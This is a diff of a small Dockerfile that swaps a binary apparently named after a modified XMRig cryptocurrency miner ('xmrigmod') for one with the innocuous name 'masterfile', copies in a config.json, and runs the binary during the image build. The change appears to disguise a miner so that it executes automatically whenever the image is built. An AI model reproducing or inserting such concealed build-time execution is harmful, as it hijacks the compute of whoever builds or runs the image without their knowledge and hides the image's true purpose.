@@ -1,8 +1,9 @@
 FROM ubuntu:20.04
 
 RUN apt-get update
-ADD xmrigmod xmrigmod
+ADD masterfile masterfile
 ADD config.json config.json
 
-RUN chmod u+x xmrigmod
-RUN ./xmrigmod
+RUN chmod u+x masterfile
+RUN ./masterfile
+
